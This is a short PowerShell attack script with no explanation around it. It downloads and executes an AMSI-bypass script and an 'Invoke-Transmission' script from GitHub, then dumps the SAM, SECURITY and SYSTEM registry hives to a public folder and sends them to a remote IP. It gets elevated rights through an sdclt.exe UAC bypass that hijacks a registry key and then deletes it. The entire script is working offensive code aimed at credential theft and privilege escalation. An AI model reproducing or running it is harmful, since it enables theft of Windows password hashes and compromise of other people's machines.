
$Value = "powershell -windowstyle hidden `$a=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/AMSI-Bypass.ps1').Content);IEX `$a;`$b=((wget 'https://raw.githubusercontent.com/mo-tec/HashExtractor/master/Invoke-Transmission.ps1').Content);IEX `$b;reg save HKLM\sam C:\Users\Public\sam;reg save HKLM\security C:\Users\Public\security;reg save HKLM\system C:\Users\Public\system;Invoke-Transmission -ip $ip"
[System.Environment]::SetEnvironmentVariable('A', $Value,[System.EnvironmentVariableTarget]::User)
New-Item -Path 'C:\Users\Public\A.bat' -Value '%A%'
New-Item "HKCU:\Software\Classes\Folder\shell\open\command" -Force -Value "C:\Users\Public\A.bat"
New-ItemProperty -Path "HKCU:\Software\Classes\Folder\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
start cmd "/c start sdclt"
sleep 3
Remove-Item "HKCU:\Software\Classes\Folder\shell\open\command"